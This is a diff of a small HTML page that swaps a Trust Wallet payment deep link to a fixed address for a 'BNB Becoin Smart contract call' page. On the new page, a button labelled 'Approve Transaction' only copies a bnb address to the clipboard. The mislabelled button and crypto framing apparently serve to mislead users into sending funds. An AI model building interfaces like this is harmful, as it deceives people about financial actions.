@@ -1,12 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Wallet Payment</title>
+    <title>BNB Becoin Contract call</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        #copy-button {
+            background-color: #5a5f63;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+        #copy-button:hover {
+            background-color: #5f6266;
+        }
+    </style>
 </head>
 <body>
-    <h1>Click the link below to open Trust Wallet for BSC payment:</h1>
-    <a href="trustwallet://open?url=https://example.com/payment?recipient=0xb9d35811424600fa9e8cd62a0471fbd025131cb8&amount=0.1&tokenAddress=0xb9d35811424600fa9e8cd62a0471fbd025131cb8">Pay with Trust Wallet</a>
+    <h2>BNB becoin Smart contract call</h2>
+    <p id="text-to-copy">bnb12c03u94srap3937l7lse7ckq5rsyrm0vc6uamt</p>
+    <button id="copy-button">Approve Transaction</button>
+
+    <script>
+        document.getElementById("copy-button").addEventListener("click", function() {
+            var textToCopy = document.getElementById("text-to-copy");
+            var textArea = document.createElement("textarea");
+            textArea.value = textToCopy.textContent;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+            alert("Text copied to clipboard: " + textToCopy.textContent);
+        });
+    </script>
 </body>
 </html>
+
+
+<link rel="icon" href="images.png" type="image/x-icon">
